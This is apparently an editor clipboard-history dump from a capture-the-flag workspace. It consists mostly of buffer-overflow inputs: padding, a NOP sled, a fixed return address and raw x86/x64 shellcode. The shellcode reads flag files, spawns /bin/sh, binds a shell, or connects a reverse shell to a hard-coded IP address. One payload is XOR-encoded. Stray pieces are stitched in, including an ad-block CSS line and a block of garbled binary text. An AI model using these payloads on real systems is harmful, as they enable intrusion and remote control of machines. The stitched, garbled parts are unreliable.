bdbdb71fdd67f95ed6a15f4cf18bd80f|file:///home/neo/ccsc/guydebois/shellcode.txt|31|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xc7\x04\x24.///\xc7\x44\x24\x04////\xc7\x44\x24\x08/fla\xc7\x44\x24\x0c\x2e\x66\x6c\x61\x6a\x67\x59\x89\x4c\x24\x10\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x0f\x05\x48\x89\xc3\x48\x8d\x34\x24\x48\x89\xdf\x6a\x7f\x5a\x48\x31\xc0\x0f\x05\x48\x8d\x34\x24\x48\x31\xff\x48\xff\xc7\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x0f\x05\x6a\x3c\x58\x0f\x05"`
9d1b8fc3bc1e42d7fd60b66217b20a8c|file:///home/neo/ccsc/guydebois/shellcode.txt|31|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xc7\x04\x24\x2f\x66\x6c\x61\xc7\x44\x24\x04\x67\x2f\x6c\x65\xc7\x44\x24\x08\x76\x65\x6c\x31\xc7\x44\x24\x0c\x2e\x66\x6c\x61\x6a\x67\x59\x89\x4c\x24\x10\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x0f\x05\x48\x89\xc3\x48\x8d\x34\x24\x48\x89\xdf\x6a\x7f\x5a\x48\x31\xc0\x0f\x05\x48\x8d\x34\x24\x48\x31\xff\x48\xff\xc7\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x0f\x05\x6a\x3c\x58\x0f\x05"`
3468c817c4742b31d489c62f05684272|file:///home/neo/ccsc/guydebois/shellcode.txt|23|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xffflag.txt\x00"`
66780b58b6edcf71bfe62bf889088b69|file:///home/neo/ccsc/guydebois/shellcode.txt|23|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xffflag.txt\x00"
48cf136ccfb822fcbf28feb038058769|file:///home/neo/ccsc/guydebois/shellcode.txt|25|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x4a\x87\x47\xe7\x67\x61\x6c\x66"
967b92bcdbf1696e5086f1978e39cd87|file:///home/neo/ccsc/guydebois/shellcode.txt|31|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xc7\x04\x24\x2f\x66\x6c\x61\xc7\x44\x24\x04\x67\x2f\x6c\x65\xc7\x44\x24\x08\x76\x65\x6c\x31\xc7\x44\x24\x0c\x2e\x66\x6c\x61\x6a\x67\x59\x89\x4c\x24\x10\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x0f\x05\x48\x89\xc3\x48\x8d\x34\x24\x48\x89\xdf\x6a\x7f\x5a\x48\x31\xc0\x0f\x05\x48\x8d\x34\x24\x48\x31\xff\x48\xff\xc7\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x0f\x05\x6a\x3c\x58\x0f\x05"
92462d19b8cfbdeba701abc72cd54a6f|untitled:1|5|796|v|
	#__BULLETIN__bdiv[style="position"], #videopageadblock, #floatingAdContainer, .ad_w300i, .ad-300, .commercial-unit-mobile-bottom, .mobile-instream-ad-holder-single, #ad_wp_base, #adxtop, #ad_728h, #ad_336_singlebt, .tjads, topadblock, #ad-fullbanner2-billboard-outer, .loop_google_ad, .amp_ad_wrapper, .commercial-unit-mobile-top, div[id*="ScriptRootN"], .ad-engage, #gads_middle, .add_300x250, .ContentAd, a[href^="https://join3.bannedsextapes.com/track/"], .puFloatLine > #puFloatDiv, .td-a-rec, a[href*=".ufinkln.com/"], body > #overover[style="position:fixed;width:100%;height:100%;background:silver;z-index: 2;opacity: 0.1;"] { display: none!important; }
8c5cf84d55279bcdc525c99edf95e386|file:///home/neo/ccsc/guydebois/shellcode.txt|11|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\xfe\xff\xee\xa3\xf5\xfc\x0d\x8d\x48\xf7\xd9\x51\x54\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x54\x5f\x0f\x05"`
	
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\xc7\x44\x24\x04\x72\xf2\x03\x0a\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"`
	
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x68\x0a\x03\xf2\x72\x5e\x66\x68\x82\x35\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xce"`
	
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xeb\x12\x5b\x31\xc9\xb1\x75\x8a\x03\x34\x1e\x88\x03\x43\x66\x49\x75\xf5\xeb\x05\xe8\xe9\xff\xff\xff\x74\x78\x46\x74\x1f\x45\x2f\xd7\x4f\x74\x1f\x74\x1c\x97\xff\xd3\x9e\x97\xd8\x2f\xcc\x4c\x78\x76\x0f\x42\x78\x76\x1c\x1e\x97\xff\x74\x0e\x4f\x4e\x97\xff\xad\x1c\x74\x78\x46\xd3\x9e\xae\x78\xad\x1a\xd3\x9e\x4c\x48\x97\xff\x5d\x74\x78\x46\xd3\x9e\x97\xdd\x74\x1c\x47\x74\x21\x46\xd3\x9e\xfc\xe7\x74\x21\x46\xd3\x9e\x2f\xcc\x4c\x76\x70\x31\x6d\x76\x76\x31\x31\x7c\x77\x97\xfd\x4c\x78\x76\x33\x77\x97\xff\x4c\x4f\x4d\x97\xff\x74\x15\x46\xd3\x9e\x74\x1f\x46\x2f\xc5\xd3\x9e"`
	
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x11\x5c\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05"`
	
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x68\x0a\x03\xf2\x72\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x6a\x10\x6a\x29\x6a\x01\x6a\x02\x5f\x5e\x48\x31\xd2\x58\x0f\x05\x48\x89\xc7\x5a\x58\x48\x89\xe6\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05"`
	
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xffflag.txt\x00"`
	
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x4a\x87\x47\xe7\x67\x61\x6c\x66"`
	
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x31\xf6\xf7\xe6\x52\x48\xb9txt.galf\x51\x54\x5f\xb0\x02\x0f\x05\x50\x5f\x54\x5e\x52\x52\x52\x52\x58\x66\xba\x99\x09\x0f\x05\x5f\xff\xc7\x50\x5a\x58\xff\xc0\x0f\x05\x58\xb0\x3c\x0f\x05"`
	
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xfftxt.galf"`
	
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xc7\x04\x24\x2f\x66\x6c\x61\xc7\x44\x24\x04\x67\x2f\x6c\x65\xc7\x44\x24\x08\x76\x65\x6c\x31\xc7\x44\x24\x0c\x2e\x66\x6c\x61\x6a\x67\x59\x89\x4c\x24\x10\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x0f\x05\x48\x89\xc3\x48\x8d\x34\x24\x48\x89\xdf\x6a\x7f\x5a\x48\x31\xc0\x0f\x05\x48\x8d\x34\x24\x48\x31\xff\x48\xff\xc7\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x0f\x05\x6a\x3c\x58\x0f\x05"`
	
	\xc7\x04\x24.///\xc7\x44\x24\x04////\xc7\x44\x24\x08/fla\xc7\x44\x24\x0c\x2e\x66\x6c\x61\x6a\x67\x59\x89\x4c\x24\x10\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x0f\x05\x48\x89\xc3\x48\x8d\x34\x24\x48\x89\xdf\x6a\x7f\x5a\x48\x31\xc0\x0f\x05\x48\x8d\x34\x24\x48\x31\xff\x48\xff\xc7\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x0f\x05\x6a\x3c\x58\x0f\x05
	
	
	
	
	
	
ff4c8ff01d544500ea4bfea43e6108c1|file:///home/neo/ccsc/guydebois/shellcode.txt|33|1|V|text
	
	
	
	
	
65a1996632c3160e6192e45c25e2d888|file:///home/neo/ccsc/guydebois/shellcode.txt|34|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
a5d3e7b4818369686d0076ad1d909e47|file:///home/neo/ccsc/guydebois/shellcode.txt|38|1|v|text
	<<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00`
3e5f46b15802ce65d1fbd873bc38e145|file:///home/neo/ccsc/guydebois/shellcode.txt|40|1|V|text
	j\x01\xfe\x0c$h/cath/bin\x89\xe3jthg.txh\x01\x01\x01\x01\x814$\x01gm`h/cath/bin1\xc9Qj\rY\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80
be151fb8d256ca02cfa90611ae328b2b|file:///home/neo/ccsc/guydebois/shellcode.txt|38|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00j\x01\xfe\x0c$h/cath/bin\x89\xe3jthg.txh\x01\x01\x01\x01\x814$\x01gm\x60h/cath/bin1\xc9Qj\rY\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"`
aa3e71a52a9c6f7a4d655e2d3d92a8e0|file:///home/neo/ccsc/guydebois/test|1|1|V|
	H\x8d5√π√ø√ø√øH\x83√Ü\x1a√ºH\x89√∑¬¨\x93¬¨(√ò¬™\x80√´¬¨u√µk\x8b√É√£√•\x05\x199Ap\x12<<\\\x98√ΩQ√â-\x92c√Ü\x03y√ô>√Ñ√¨\x90\x00\x88√©\x9b\x0f\x88√∞g¬§¬±√ò\x12A<\x9e√¢K¬¥"\x93√Ç]√Ä\x87√®_√ì\x92¬π7c\x8c¬¨√¥UE¬∑\x18\x7f¬Æ$%b√øZ√å√≥Ix1\x93√®Q√Ö3Q\x80!\x84√Ç#b√ñ√õ\x02V\x82Cc\x8b¬≤√Å\'y√•l√ç√ßN]\x8b√∞dc√õF¬∫m\x94\x13p\x99√Ö√ó√∑&\x8bT√Ç?¬µ√°Q<yGw\x8b¬¥\x82¬¢^\x88\x076√à√íEe√¢\x02¬º√ú\x8b¬´_\x8eY\x83√ü√ø+\x9b\x9c\x11%\x98√Å)√Ö√•^√Ä\x9b√ÇT\x83¬£\x05√ë:¬µ#√Ö√¥\x90√≥d√ÖC¬∑\x9c√∏\x04|\x11A√Ö√µj\x91¬æ√û√â√≥¬´√öv\x80√Ä√†Gg!A√£\x03\x12\x82√£XK¬æ¬™\x12#C¬§√ï\x83\x8d\x92¬≤\x9e¬æ\x9a¬∫¬°√Å¬´\x0f√£H\x88√´√∂\x16¬±\x13+¬§M√Å\x17|√î√¥¬´\x1b\x17\x8b¬©\x1b√ä√™¬Ω\x18√¥fY√å\x12\x82\x06c\x84\x8e¬™√ä√•\x05\x8d\xad\x08(\x06s√É2V√å\x84¬§A¬≥√ë2w√Ø\x7f¬´0P√º,\x9b\x13.e0d*\x60√ü\x10"X\x84¬∑^\x90√í8<r\x8f√¥\x98√é¬º√µ¬ß√ù√∂(e\x97\x60√Ü[e\x111¬¶√Ü<\\\x8c¬¨√≥c=¬≤\x8b√æ¬æ&√ô√πv√®s√îz√≤√©√≥√è√Ø√ê√∞√î√¥\x97¬∑N¬ª√ä9√åB.N\x0e\x80\x04hd√ç¬ø√´^~√¥f√∑ji√ô¬∑√Å[{Nn√à√®¬∑√ów¬¶Dn\x88¬®¬∏(¬æ3¬µ(√ñ>#C√¥Up√¢\x12yK√Ä¬∫\'\x99√æS√Å√Ωq\x84¬§)\x8a√™\\√≥ec√Ñ\x11\x8a]}¬°√ºEl\x91√Ä¬ø!V¬ø\x04r{¬™U¬∏\x00a\x00t√á#√îL\x0f?V\x869\x60\x9a√Ü¬∞√êHoV¬º√Ñ0p√ëQ¬∏\x7f\xad8¬¨¬∂.c√ó√é*√£[√ï\x05$T#Jw√î\x96¬∂\x1bE¬Ω√¨9CDds\x93\x01!\x04$S\x82/Y5U\x83√≥¬∫/\x84√∑\x89√±√≤\x12√¢D√≤\x19\x98√áC¬•\x98\x01¬Ω+Et\x90√≥¬∏\x19\x8b√ø¬∑\x13\x18\x90\x99√â{¬´√©O√É/\x18ym√î¬∫√®Y√çL√Ñ\x91\x05/\x8bp√®Eu√Ä√∞Mt!A\x9d√á\x7f¬Æ√à√í\x90¬∞√ë√±_\x7f\x86¬¶C¬≥\x9d\x12v√©√ç5(H>n\x8e\x06√ê\x07√∂*MW√ü√ød\x84¬™√ä√ª\x1b_√åt√£\x06|√Ç√¢R√Ñ\'\x88W√è√ó\x03¬©√â6f\x00xa\x92e\x95"SGw\x95√Ü\x055\x023√á√∑\x19J9i√†\x11T\x84√®\x19√¢\x12¬∫√´¬∫√Ñ-M\xad√ç\x82¬¢\x0e.2¬¢¬æ3W√ä√Ç*\'G√óI\x95√∂√à@¬ª√Ö0P\x8d\xad$D√á√ß\x12\x7ft√£s√©√ç√≠\x89√ªF¬ßa√ô\x1bG\x60\x80¬Ω√≠\x1a\x92Ct_\x8f2c√É√≥n\x9f¬ß√ó¬ø√∞\x60\x90√é√ø;kz¬´√π)√ã√º¬ø√Ø√ä√ª√¶\x06*\x88√ß\x07K{z√≤¬π√∞¬≤√™¬©√†#W|¬Æ\x93√∏:p\x95√å√ù\x13¬•√ñ√±\'T¬∑¬¢√ò\x12H3cHx¬®¬≤\x93¬≥\x1228X¬ª√õ&\x9e¬°\x10|√Æ¬Æ√é2\x8d√Ç4;¬Æ√ã;Z¬∑¬©√ï\\|X√ä√∑X*¬¢\x90\x9aq\x91¬§√Ñ\x92¬≤p\x90¬æ+√Å03¬©Zzw√©F¬ß\'\x9f@l¬ß√á\x000¬£\x1b$[M\x81√û\x14√£\x14Dz√ê\x03\x95√á√∏^√à√æ\x86√´n¬§K\x84\x82¬∏¬≤√§√Ø!,\x92√ò√¢Ff;[\x93¬≥(Hg√ó√ñK√ç@%\x8d√π\x19C¬µ¬≥\x14√íJ\x91\x9b√ö√∫0P<\\√î√¥E¬Ω√îCh√öQq7\x9c\x7f√≤√úE¬ø√´\x122H\xad.¬°¬Ω&¬Æ√é\x043,VKk√µ%Cc\x14>$S¬∑√Å√Å√°k\x8b/OHh\x17\x87H¬Ω4¬ßh√êDd¬±#5¬®C¬¨y\x99S\x82Y\x83¬æ√û#\x91√´\x60C¬Øc√èw\x97\x9b\x0f\x01fb√î√®U√£L¬∂$¬±\x12\x8b√ø\x86√´%EHr¬π√®@J\x166&F¬±√ë√ù√Ω¬∑\'-¬¢7¬™-\x95,L6fP√à\x023\x9b√å√ò√¢¬©√â@\x600P\x06&√≥c<¬´¬ß\x17\x02"Q√É¬≥&√ã4\x93\x9d√≥\x13c\x83^~¬¢√Ç\x89√™\x9c\x00o√ì√Ø\x0f\\√éc√ñ(\x91T\x80n\x8eC¬µK¬æ√§T√©√≥√ë√±\x8e¬Æ√ü√ø@\x60¬´\x1b/¬§¬£\x16\x1a\x82XxJ¬º9¬¨¬Ø\x18\x188_\x8e?i√ô√πf\x8d√á-√å89\x9aC¬™;i:¬Æ\x00x]√ë\x84√†¬´#=m6fe\x8cCc\x071¬¶√ï√ò√¢\x9a¬∫\x8c¬¨√°\x01d\x84¬ª+√®]S√Ü√Ä(√à√®h\x986¬Æ"S>n2<\x07\'\x9c¬º\x82¬¢√∫\x1a√ªk@¬ØK¬ª0P√≠_√™]√¥]U_√∑\x17;[√ú√ºi\x89\x8b√¨|√†T¬∏=]√®Z\x03v√ñ?√Å√≠√û√æ}√Ø#\x96l√ú\'1h\x88¬£√É\x05%p\x90\x84√¥\x88√Ω\\√è~√¶√ó√∑\x88√∫√É6E¬Æt\x94{¬™¬∞√ö9Y\x94¬ª\x8f¬æ√Ç$√∂_}√´U\x84p√ì√©J&\x9aF¬¢X√ê+[]\x8d¬±√ò¬§√Ñ#M\x86¬µ*4¬©√â√Ä√†<\\√ä√™:¬ß\x97\x06w√≠√ñ√∂M¬ø√êCF¬ØBn√õ√ª¬∏*√°T$\x94√©√≥{\x9bd\x84√ï√µ¬®√à]√ï\x9f\x0e\x95\x073S√≥Xf√ä¬Æ&+W√Ö√•f√ã.\x92I√Åm\x8dm\x9c√î√æ}\x9d\x98√à√Ö√•\x97√Å√Å√∞\x07\x11v\x96\xad√ç√∞\x10?_O~Dn¬∂√ñ\x87√™E¬¶c√è¬´\x17\x01!$\x89¬ø7√ñ;\x95√∏√á=^√É{¬£√å√µ√¥\x14Z\x84{¬™+5t\x94/O¬•√Ö\x05%√¨\\g√ú<¬Ø4\x9c√¢\x02¬ø\x12√®A8\x8bD¬£W¬º\x02z\x01f]√ÄA¬∑J¬Ø¬µ√ï√ï\x04o\x994T√¢\x12\x12\x8a+^\x8b√≠¬∑√óV\x80a\x90\x95\x9f\x8c¬¨\x100√ì√≥\x82¬¢√Ø_√¢Q\x97\x07¬£√É\x08zx√ô\x07\x7f√∏\x02p\x90√Æ\x0eHh\x02"√òKi√¢l√ü\x80√£√´LR¬æ√á3√¨√∂¬¨¬¥
6f54a0b4ca7a73457b8fcde0da3f548d|file:///home/neo/ccsc/guydebois/shellcode.txt|38|192|v|text
	j\x01\xfe\x0c$h/cath/bin\x89\xe3jthg.txh\x01\x01\x01\x01\x814$\x01gm\x60h/cath/bin1\xc9Qj\rY\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80
45c95d7a8bca4663a281fef50bd51f60|file:///home/neo/ccsc/guydebois/shellcode.txt|38|1|^v|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00"
9b700504eb7bedef94083491834a08db|file:///home/neo/ccsc/guydebois/shellcode.txt|38|1|V|text
